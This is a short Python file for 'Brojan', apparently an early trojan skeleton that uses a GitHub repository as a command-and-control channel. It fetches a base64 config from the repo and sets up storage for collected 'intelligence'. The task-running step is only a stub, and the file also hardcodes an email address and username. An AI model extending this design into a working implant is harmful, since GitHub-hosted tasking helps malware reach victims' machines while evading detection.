import json
import base64
import sys
import time
import random
import threading
import queue
import os
from github import *


class GitHubSession():
    username = "mantvydo@gmail.com"
    username = "mantvydasb"
    session = ''

    def __init__(self, username=username):
        password = input("Github password: ")
        self.session = Github(username, password)
        self.repository = self.session.get_repo(self.username + "/network-playground")
        self.branch = self.repository.get_branch("master")

    def getFileContents(self, pathToFile):
        content = self.repository.get_contents(pathToFile)
        return content


class Brojan():
    id = "1"
    configPath = "brojan/configs/" + id + ".json"
    intelligenceStoragePath = "data/%s/" % id
    modules = []
    configured = False
    tasksQueue = queue.Queue()
    github = ''

    def __init__(self):
        self.github = GitHubSession()
        config = self.getConfig()
        self.processTasks(config)

    def getConfig(self):
        config = self.getFileContents(self.configPath)
        config = base64.b64decode(config.content).decode("utf8")
        configJson = json.loads(config)
        return configJson

    def getFileContents(self, filePath):
        return self.github.getFileContents(filePath)

    def processTasks(self, config):
        for module in config:
            if module['module'] not in sys.modules:
                print("")

        self.configured =  True

Brojan()


